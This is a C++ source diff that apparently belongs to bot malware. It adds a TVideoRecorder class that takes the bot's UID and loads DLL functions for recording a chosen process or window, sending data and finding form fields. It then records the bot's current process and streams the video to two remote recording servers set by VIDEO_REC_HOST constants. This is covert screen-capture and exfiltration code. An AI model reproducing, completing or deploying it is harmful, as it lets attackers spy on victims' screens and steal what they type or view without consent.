@@ -99,14 +99,57 @@ void TVideoRecDLL::LoadFunc(LPVOID *Addr, const char* Name)
 
 void TVideoRecDLL::InitializeApi()
 {
-	LoadFunc((LPVOID*)&FRecordProcess,   "StartRecPid");
-	LoadFunc((LPVOID*)&FRecordWnd,       "StartRecHwnd");
-	LoadFunc((LPVOID*)&FStop,            "StopRec");
-	LoadFunc((LPVOID*)&FResetTimer,      "ResetTimer");
-	LoadFunc((LPVOID*)&FSendData,        "StartSend");
-	LoadFunc((LPVOID*)&FStartFindFields, "StartFindFields");
-    LoadFunc((LPVOID*)&FStopFindFields,  "StopFindFields");
+	LoadFunc((LPVOID*)&RecordProcess,   "StartRecPid");
+	LoadFunc((LPVOID*)&RecordWnd,       "StartRecHwnd");
+	LoadFunc((LPVOID*)&Stop,            "StopRec");
+	LoadFunc((LPVOID*)&ResetTimer,      "ResetTimer");
+	LoadFunc((LPVOID*)&SendData,        "StartSend");
+	LoadFunc((LPVOID*)&StartFindFields, "StartFindFields");
+	LoadFunc((LPVOID*)&StopFindFields,  "StopFindFields");
 }
+
+
+
+
+
+//*****************************************************************************
+//                                    TVideoRecDLL
+//*****************************************************************************
+TVideoRecorder::TVideoRecorder()
+{
+	UID        = Bot->UID();
+	Server     = VIDEO_REC_HOST1;
+	Server2    = VIDEO_REC_HOST2;
+	Port       =  VIDEORECORD_DEFAULT_PORT;
+	Port2      =  VIDEORECORD_DEFAULT_PORT;
+    RecordTime = 0;
+}
+//--------------------------------------------------------------
+
+TVideoRecorder::~TVideoRecorder()
+{
+
+}
+//--------------------------------------------------------------
+
+void TVideoRecorder::ReccordProcess(DWORD PID)
+{
+	if (FDLL.RecordProcess)
+	{
+		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
+						   Server.t_str(), Port,
+						   Server2.t_str(), Port2, RecordTime);
+    }
+}
+//--------------------------------------------------------------
+
+void TVideoRecorder::ReccordCurrentProcess()
+{
+	ReccordProcess(Bot->PID());
+}
+//--------------------------------------------------------------
+
+
 
 
 //*****************************************************************************
